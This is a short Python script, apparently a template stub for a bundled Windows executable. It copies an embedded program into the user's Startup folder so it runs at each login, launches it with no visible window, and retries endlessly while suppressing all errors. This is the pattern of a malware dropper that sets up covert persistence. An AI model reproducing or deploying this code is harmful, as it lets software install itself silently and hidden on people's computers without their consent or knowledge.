import shutil
import os
import sys
import subprocess

launch = True

while launch:
    try:
        os.chdir(sys._MEIPASS)

        if hasattr(sys, "_MEIPASS"):
            source_file = os.path.join(sys._MEIPASS, "${windows.autoexe.path}")

        appdata = os.getenv("APPDATA")
        path = os.path.join(
            appdata,
            "Microsoft",
            "Windows",
            "Start Menu",
            "Programs",
            "Startup",
            "${windows.autoexe.path}",
        )
        shutil.copyfile(source_file, path)
        subprocess.run([path], creationflags=subprocess.CREATE_NO_WINDOW)
        launch = False
    except Exception as e:
        launch = True
        continue

